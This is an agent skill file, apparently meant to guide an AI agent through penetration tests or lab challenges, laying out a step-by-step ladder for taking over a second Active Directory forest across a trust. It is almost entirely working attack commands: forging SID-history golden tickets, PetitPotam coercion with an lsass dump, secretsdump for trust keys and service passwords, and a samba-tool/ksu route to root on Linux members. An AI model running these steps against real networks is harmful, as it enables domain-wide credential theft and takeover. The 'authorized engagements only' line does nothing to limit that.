---
name: cross-forest-trust-abuse
description: Use when two AD forests share a trust. Trust attack ladder.
---

# Cross-Forest Trust Abuse (reusable)

Two-forest AD engagements (forest A compromised → forest B is the objective).
Assumes you hold Domain Admin (krbtgt AES key + full NTDS dump) of forest A.
Authorized engagements only.

## Step 0 — Map the trust
- From forest A: `ldapsearch -b "CN=System,DC=A,DC=domain" "(objectClass=trustedDomain)"`
  → trust partner name + `trustAttributes` (8 = WITHIN_FOREST is internal;
  cross-forest trusts show external flags) + trust SID.
- Identify forest B's domain SID: `lookupsid.py -k -no-pass
  'A.DOM/celia@dcB.B.domain'` (pick any known-B user) → `Domain SID is:
  S-1-5-21-...`
- Cross-forest NTLM usually works: `SMBConnection.login('user', 'pass',
  domain='B.domain')` against B's DC with A credentials → confirms trust
  direction and access level.

## Step 1 — The DCSync wall (expected failure)
- DCSync against B's DC with A credentials fails `ERROR_DS_DRA_BAD_DN` —
  impacket requests A's NC, B rejects it. This is impacket's limitation, not
  a rights failure. Do NOT conclude 'no replication rights' from it.

## Step 1.5 — Gate: is the trust QUARANTINED? (decides the entire ladder)
Decode `trustAttributes` on the `trustedDomain` object BEFORE investing in
SID history. Bit mask: 0x1 NON_TRANSITIVE, 0x2 UPLEVEL_ONLY,
0x4 QUARANTINED_DOMAIN, 0x8 FOREST_TRANSITIVE, 0x10 CROSS_ORGANIZATION,
0x20 WITHIN_FOREST, 0x40 TREAT_AS_EXTERNAL.
- **0x4 or 0x40 set → SID filtering ENFORCED.** Every non-well-known
  (S-1-5-21) SID in a PAC is stripped at the boundary. Step 2 is DEAD on
  this trust: forged extra-SID tickets arrive sanitised and look like a
  rights failure. Do not spend hours on it. `0x48`
  (TREAT_AS_EXTERNAL|FOREST_TRANSITIVE) counts as quarantined.
- Clean trust → Step 2 works, forge away.
- Quarantined → go to Step 2b instead.

Step 2b, the SDDL recipe, the well-known-SID table and the ldap3 schema
traps live in `references/quarantined-trust-and-sid-filtering.md`.
Multi-hop pivoting (SSH forward sets through a dual-homed host) and keeping
an engagement's state across a context boundary live in
`references/pivot-and-state-recovery.md`.

## Step 2 — SID-history golden ticket (only on a NON-quarantined trust)
1. Identify a B-domain group worth joining (read the B domain via LDAP
   cross-forest referral or BloodHound): e.g. `InfrastructureAdministrators`
   nested in `Backup Operators` → SeBackupPrivilege.
2. Get B group's RID: LDAP query on B's DC for the group `objectSid`.
3. Forge with forest A's krbtgt AES key:
   `ticketer.py -domain A.domain -domain-sid <A_SID> -aesKey <krbtgt_aes>
   -user-id <REAL_A_RID> -extra-sid <B_domain_SID>-<group_rid> <A_user>`
4. **Real RID mandatory** — Server 2025 PAC hardening rejects fictitious
   RIDs with KRB_AP_ERR_MODIFIED; you'll waste an hour blaming the ticket.
5. The ticket grants the extra-SID group's rights INSIDE B, but NOT
   B-domain-admin rights: writable ADMIN$ / DRSUAPI usually still denied.

## Step 3 — What the extra-SID actually unlocks
- SeBackupPrivilege (via Backup Operators): SMB backup-intent reads of
  SAM/SYSTEM/NTDS — needs SMB3 `FILE_FLAG_BACKUP_SEMANTICS` create flag;
  impacket 0.13 doesn't set it, so use diskshadow/robocopy ON a B host you
  can exec on, or a low-level SMB3 client.
- If B domain has a Linux/NUC member in a MIT-Kerberos realm (kinit works,
  `ksu` installed): see the ksu trick below — often the cleanest root.
- Coercion chains: with unconstrained delegation on A's DC, coerce B's DC
  to authenticate to A's DC (PetitPotam EFS: `-pipe efsr -d A -u user -p
  pass <A_dc_ip> <B_dc_fqdn>` — "Attack worked!" = success). The B-DC's
  machine TGT lands in A-DC lsass → dump (comsvcs MiniDump) → pypykatz →
  use the forwarded ticket. Timing matters: dump within seconds.

## Step 2b — Quarantined trust: hunt well-known-SID rights in B
SID filtering only strips S-1-5-21 (domain) SIDs — it CANNOT strip
well-known SIDs, and any principal you authenticate with across the trust
carries `S-1-5-11` Authenticated Users. So the surviving attack surface is
an ACE in B granting a write right to a well-known SID.
1. Confirm read access to B's directory still works as an A-domain DA
   (cross-forest reads usually survive even when writes are refused — a
   denied write is NOT evidence the route is closed).
2. Dump `nTSecurityDescriptor` for B's domain root, every group nested into
   a privileged builtin (`Backup Operators`, `Server Operators`,
   `Account Operators`), each DC computer object, and the OUs holding users
   and computers. Parse to SDDL with impacket `ldaptypes`, don't hand-roll.
3. Grep the SDDL for `S-1-5-11`, `S-1-1-0`, `S-1-5-32-545`/`544` carrying
   WriteMembers / WriteProperty / GenericAll / CreateChild, and note the
   object it sits on.
4. An EMPTY group nested into a privileged builtin group is the signature of
   the intended path: the objective is whoever can add its members, so read
   that group's ACL next, not its membership.
5. Map the resulting right to a host you can reach and use it there.

## The ksu root trick (Linux member in MIT-Kerberos realm)
If a B-forest Linux host runs MIT Kerberos with `ksu`:
1. LDAP over GSSAPI as any B-forest principal (fix `SASL_NOCANON on` in a
   FILE via `LDAPCONF` — env var alone silently ignored; needed when the DC
   has no PTR record).
2. Find CreateChild rights on some OU (your runner/service account often
   has them on a migration OU).
3. `samba-tool user create root '<pw>' --userou="OU=TargetOU" -H
   ldap://dcB.B.domain --use-kerberos=required`
4. `echo <pw> | kinit root@B.REALM` then pipe commands:
   `echo "id; cat /root/root.txt" | script -qc "ksu root" /dev/null`
5. **Never use `ksu root -e <cmd>`** — ksu's get_best_princ_for_target()
   returns NOT_AUTHORIZED when -e is passed and no .k5login/.k5users exists.
   The interactive path falls through to aname_to_localname and succeeds.

## Offline-wheel pipelining (isolated targets)
Targets behind the trust usually have no internet. To install tooling:
1. Locally: `pip download <pkg> -d /tmp/wheels` (grab ALL deps).
2. `tar czf wheels.tgz -C /tmp/wheels .` then pipe over SSH/exec:
   `cat wheels.tgz | ssh target 'cat > /tmp/w.tgz && tar xzf /tmp/w.tgz -C /tmp/wheels'`
3. Target: `pip install --no-index --find-links /tmp/wheels <pkg>`.
4. No pip on target: `python3 -m venv --without-pip /tmp/pv` + `python
   /path/to/pip-*.whl/pip install ...` (pip wheels contain an embedded
   `pip/` module runnable directly).
5. Version-mismatch trap: some packages pin upper bounds (aiowinreg<=0.1.0
   etc.) — download the exact pinned version or install with --no-deps in
   dependency order.

## LSA/machine-account gold
- `secretsdump` of forest A's DC (you're DA) yields: trust account
  `<B_domain>$` hash (RID ~1103) = the inter-realm key; svc plaintext
  passwords in LSA (_SC_* entries); DPAPI machine keys.
- Service-account plaintexts (`_SC_<service>`) frequently work across the
  trust (password reuse) — test every one against B's DC.

## Reporting notes
- Cross-forest DA via SID history is a full-trust compromise — document
  the trust configuration flag (e.g. CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION
  on the trust enables TGT forwarding, the root cause enabling coercion).
